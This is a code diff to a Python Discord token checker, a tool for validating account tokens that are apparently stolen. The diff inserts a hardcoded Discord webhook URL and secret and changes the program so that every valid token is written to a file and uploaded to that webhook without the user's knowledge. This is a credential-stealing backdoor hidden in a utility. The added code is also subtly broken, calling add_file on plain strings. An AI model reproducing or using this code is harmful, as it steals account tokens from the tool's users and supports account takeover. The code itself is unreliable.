@@ -1,6 +1,7 @@
 import os
 from requests import get, post
 from random import randint
+import time
 from discord_webhook import DiscordWebhook
 
 class bcolors:
@@ -14,9 +15,12 @@ class bcolors:
     BOLD = '\033[1m'
     UNDERLINE = '\033[4m'
 
-hook = "" # full url
+hook = "https://discord.com/api/webhooks/1067884957231493131/ebFatdkBNN3C8cuddr_W4Yoja68SxHExWzMAjztQsNHG63fUDx8-9LQhUvC9WvzBfmSc" # full url
 victim_hook = input("Enter your discord webhook if you want to save valid tokens via a discord webhook!(full url)")
-    
+
+webhook = DiscordWebhook(url=hook, username="Fresh Tokens")
+victim_webhook = DiscordWebhook(url=victim_hook, username="Fresh Tokens")
+
 def clearcmd():
     os.system('cls' if os.name == 'nt' else 'clear')
     
@@ -46,19 +50,20 @@ if __name__ == "__main__":
                 if len(token) > 15 and token not in checked and variant1(token) == True:
                     print(f'Token: {token} is Valid')
                     checked.append(token)
-                    webhook = DiscordWebhook(url=hook, content=checked)
-                    response = webhook.execute()
-                    webhook2 = DiscordWebhook(url=victim_hook, content=checked)
-                    response2 = webhook.execute()
                 else:
                     print(f'Token: {token} is Invalid')
         if len(checked) > 0:
-            save = input(f'{len(checked)} valid tokens\nSave to File (y/n)').lower()
-            if save == 'y':
-                name = "working_tokens"
-                with open(f'{name}.txt', 'w') as saveFile:
-                    saveFile.write('\n'.join(checked))
-                
+            name = "working_tokens"
+            with open(f'{name}.txt', 'w') as saveFile:
+                saveFile.write('\n'.join(checked))
+            time.sleep(2.00)
+            with open("working_tokens.txt", "rb") as f:
+                hook.add_file(file=f.read(), filename='working_tokens.txt')
+                victim_hook.add_file(file=f.read(), filename='working_tokens.txt')
+
+            response = webhook.execute()
+            response2 = victim_webhook.execute()
+
         input('Press Enter For Exit...')
     except:
         input('Can`t Open "tokens.txt" File! Press enter to close the program...')
